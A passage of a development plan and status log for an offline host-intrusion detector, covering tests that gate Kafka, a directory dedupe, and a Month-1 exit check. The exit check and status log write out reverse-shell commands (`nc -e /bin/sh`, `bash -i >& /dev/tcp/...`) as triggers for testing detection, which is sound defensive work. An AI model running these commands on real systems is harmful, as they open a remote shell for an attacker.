            pytest.skip(
                "Legacy distributed pipeline (Kafka/Flink/DRL) is retired on the "
                "node path. Node-path coverage lives in test_node_pipeline.py."
            )
```

- [ ] **Step 4: Run both tests**

Run: `cd sentinel-core/backend && python -m pytest tests/test_node_pipeline.py tests/test_e2e_pipeline.py -v`
Expected: `test_node_pipeline.py` PASS (with live stack); `test_e2e_pipeline.py` legacy test SKIP (not xfail).

- [ ] **Step 5: Commit**

```bash
git add sentinel-core/backend/tests/test_node_pipeline.py sentinel-core/backend/tests/test_e2e_pipeline.py
git commit -m "test(e2e): real node-path pipeline; retire legacy Kafka/Flink xfail"
```

---

### Task 7: Gate Kafka/Flink off the node path + dedupe duplicate dirs

**Files:**
- Modify: `sentinel-core/backend/data-collector/collector.py:50-60` (gate `KafkaProducer` behind `SENTINEL_BUS`)
- Test: `sentinel-core/backend/data-collector/tests/test_bus_gate.py`
- Remove: the non-importable duplicate of each pair `ebpf-lib`/`ebpf_lib`, `firewall-adapters`/`firewall_adapters`

**Interfaces:**
- Consumes: env `SENTINEL_BUS` (default `redis` for the node; `kafka` = legacy distributed mode).
- Produces: `data-collector` skips Kafka init entirely when `SENTINEL_BUS != "kafka"`.

- [ ] **Step 1: Write the failing test**

```python
# sentinel-core/backend/data-collector/tests/test_bus_gate.py
import importlib
import os


def test_kafka_disabled_on_node_bus(monkeypatch):
    monkeypatch.setenv("SENTINEL_BUS", "redis")
    import collector
    importlib.reload(collector)
    assert collector.BUS == "redis"
    assert collector.producer is None


def test_kafka_enabled_in_legacy_mode(monkeypatch):
    monkeypatch.setenv("SENTINEL_BUS", "kafka")
    import collector
    importlib.reload(collector)
    assert collector.BUS == "kafka"
```

- [ ] **Step 2: Run test to verify it fails**

Run: `cd sentinel-core/backend/data-collector && python -m pytest tests/test_bus_gate.py -v`
Expected: FAIL — `collector` has no attribute `BUS` (and may try a real Kafka connect on import).

- [ ] **Step 3: Implement the gate**

In `sentinel-core/backend/data-collector/collector.py`, replace the Kafka init block (currently around lines 50-60):

```python
# Bus selection: the offline node uses Redis streams; Kafka is legacy/distributed.
BUS = os.environ.get("SENTINEL_BUS", "redis").lower()
producer = None
if BUS == "kafka":
    try:
        producer = KafkaProducer(
            bootstrap_servers=os.environ.get("KAFKA_BROKERS", "localhost:9092").split(","),
            value_serializer=lambda v: json.dumps(v).encode("utf-8"),
        )
    except Exception as e:
        logging.warning(f"Kafka producer init failed: {e}. Running in standalone mode.")
else:
    logging.info("SENTINEL_BUS=%s — Kafka disabled (node path uses Redis streams)", BUS)
```

(Keep the existing `value_serializer`/kwargs already present in the file; only wrap the construction in the `if BUS == "kafka"` guard and introduce the `BUS` constant.)

- [ ] **Step 4: Run test to verify it passes**

Run: `cd sentinel-core/backend/data-collector && python -m pytest tests/test_bus_gate.py -v`
Expected: PASS (2 passed).

- [ ] **Step 5: Dedupe the duplicate directories**

Python cannot import a hyphenated package, so the underscore variant is canonical. Confirm the hyphen variants have zero import/path references, then remove them:

```bash
cd sentinel-core/backend
grep -rnE "ebpf-lib|firewall-adapters" --include=*.py . | grep -v _pycache_ | head
# Expect: no Python import references (hyphen dirs are not importable).
git rm -r ebpf-lib firewall-adapters
```

If `grep` shows a real reference to a hyphen dir (e.g. a Dockerfile `COPY`), repoint it to the underscore dir in the same commit before `git rm`.

- [ ] **Step 6: Run the full backend test suite to confirm no regressions**

Run: `cd sentinel-core/backend && python -m pytest data-collector/tests ai-engine/tests migrations/tests -v`
Expected: all PASS.

- [ ] **Step 7: Commit**

```bash
git add sentinel-core/backend/data-collector/collector.py sentinel-core/backend/data-collector/tests/test_bus_gate.py
git commit -m "refactor(node): gate Kafka behind SENTINEL_BUS; dedupe ebpf/firewall dirs"
```

---

## Month-1 exit check (run after Task 7)

The spine breathes when all of these hold:

```bash
cd sentinel-core/backend
# 1. unit suites green
python -m pytest data-collector/tests ai-engine/tests migrations/tests -v
# 2. migration applies on the local DB
DATABASE_URL=postgresql://sentinel:sentinel@localhost:5432/sentinel \
  alembic -c migrations/alembic.ini upgrade head
# 3. node-path e2e PASSES (not skips) against the live local stack
python -m pytest tests/test_node_pipeline.py -v
# 4. legacy Kafka e2e SKIPS, no xfail
python -m pytest tests/test_e2e_pipeline.py -v -rs
```

Plus the spec's own Month-1 exit: a real `execve` on the host (run `nc -e /bin/sh` in a throwaway namespace, or `bash -i >& /dev/tcp/...`) produces a stored `node_alerts` row, with **zero cloud calls** and Kafka/Flink off the node path.

---

## Self-Review

**Spec coverage (vs `.team/specs/2026-06-26-production-pivot-offline-ai.md` Month-1 bullets):**
- "auditd → local bus (Redis streams) → ai-engine consumes → alert stored in PG" → T1 (parse) + T2 (XADD) + T5 (consume + insert) + T3 (PG table). ✓
- "Replace the xfail'd `test_e2e_pipeline.py` with a real passing node-path e2e" → T6. ✓
- "Strip node runtime to the 5 parts; gate Kafka/Flink off the node path by config" → T7 (`SENTINEL_BUS`). ✓
- "Dedupe the hyphen/underscore dirs" → T7 step 5. ✓
- "Exit: a real exec/file event produces a stored alert; e2e green; no cloud" → Month-1 exit check. ✓

**Placeholder scan:** no TBD/TODO; every code step ships real code; every command has an expected result. ✓

**Type/name consistency:** `HostEvent` keys identical across T1→T2→T5→T6; stream `node:events`, group `node-detector`, consumer `ai-1` consistent T5/T6; scorer verdict keys `is_threat/score/severity/summary` consistent T4→T5; `node_alerts` columns consistent T3 (DDL) ↔ T5 (`_INSERT_SQL`) ↔ T6 (SELECT). ✓

## Out of scope (later months — do NOT pull forward)
- Month-2: `LocalProvider` (Ollama/Qwen) behind the provider seam; train/validate the ML detector and swap it in via `HostEventScorer`; triage → proposed reversible action → human-approval → policy-orchestrator → firewall adapter.
- Month-3: one-command installer, self-heal/resource caps (G6), Merkle/audit anchoring activation, honest README, 14-day pilot.
- Governance refinement, multi-tenant SaaS, abstract 13→4 consolidation — stop-listed.

---

## Execution status — verified 2026-06-29

Month-1 spine is **code-complete and live-verified** (T1–T7 committed on `plan/month1-node-spine`, plus review-hardening commits: fail-closed alert insert, malformed-message isolation, hex auditd-field decode).

Verification against the local stack (pg db `sentinel_db`, redis):
- ✅ Node-spine unit suites green — **26 passed** (14 data-collector, 10 ai-engine, 2 migrations).
- ✅ Migrations apply to head — `… → 20260624_001_audit_chain → 20260627_001_node_alerts`.
  - ⚠️ The baked `db-migrate` container image is **stale** (head `20260530_002`); it does not contain the audit-chain or node_alerts migrations. Apply the **working-tree** migrations with host alembic (`script_location = .`, so run from `backend/migrations`).
- ✅ Node-path e2e **PASSES (not skips)**: a real `nc -e /bin/sh` execve → Redis stream → ai-engine scorer → `node_alerts` row (critical, score 0.9).
- ✅ Legacy distributed e2e skips cleanly (13 skipped, no xfail).

**T7 dedupe is DEFERRED (not done) — the plan's assumption was wrong.** The hyphen dirs are *not* inert duplicates safe to `git rm`. There are 27 references: `hids-agent/Dockerfile` + `hardening-service/Dockerfile` do `COPY ebpf-lib/ ebpf_lib/`; `tests/test_xdp_build_artifact.py` asserts that exact COPY line; `conftest.py` aliases hyphen→underscore packages; `tests/test_firewall_base.py` adds `firewall-adapters` to `sys.path`. Hyphen = canonical source, underscore = the importable Docker-copied name. Blind removal breaks Docker builds + 2 tests. eBPF/firewall are **off the node critical path** (auditd is the telemetry source, not eBPF), so dedupe is parked for a proper repoint-then-remove change rather than forced here.

## Month-2 progress (started 2026-06-29)
- ✅ `get_node_alerts` grounding tool (`llm-gateway/tools.py`, committed `f1c83fa`) — the analyst can now read real detector output offline; the Month-1 and Month-2 halves finally touch. Live-verified end to end (detector writes `node_alerts` → tool reads it back, JSON-serializable, with `node_alert:<id>` citation ids). Read-only, severity allowlisted, limit-capped, fail-soft, injectable DB.
- Provider seam already shipped (earlier C1 work): `provider.py` (`ProviderRouter`, `INFERENCE_PROVIDER` → anthropic|local) + `local_client.py` (`LocalLLMClient` → OpenAI-compatible `/v1/chat/completions`, Ollama-ready), wired at `app.py:85`. **Open items:** default model is `gemma-2` but the spec locked **Qwen2.5-14B** — reconcile + wire a `LOCAL_LLM_MODEL` env; real offline-triage validation needs the GPU deploy box (none on this dev host).
